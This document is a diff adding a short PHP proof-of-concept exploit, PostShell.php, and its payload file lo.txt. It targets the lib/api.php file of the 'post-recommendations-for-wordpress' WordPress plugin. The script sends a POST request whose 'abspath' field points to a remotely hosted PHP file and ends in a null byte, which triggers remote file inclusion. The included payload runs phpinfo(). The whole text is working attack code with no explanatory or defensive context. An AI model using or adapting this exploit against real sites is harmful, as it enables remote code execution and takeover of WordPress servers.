@@ -1,0 +1,18 @@
+PostShell.php
+<?php
+
+$ch = curl_init("http://localhost/wordpress/wp-content/plugins/post-recommendations-for-wordpress/lib/api.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, array('abspath'=>"http://localhost/lo.txt\0"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+
+print "$postResult";
+
+?>
+
+
+lo.txt
+<?php phpinfo(); ?>
+
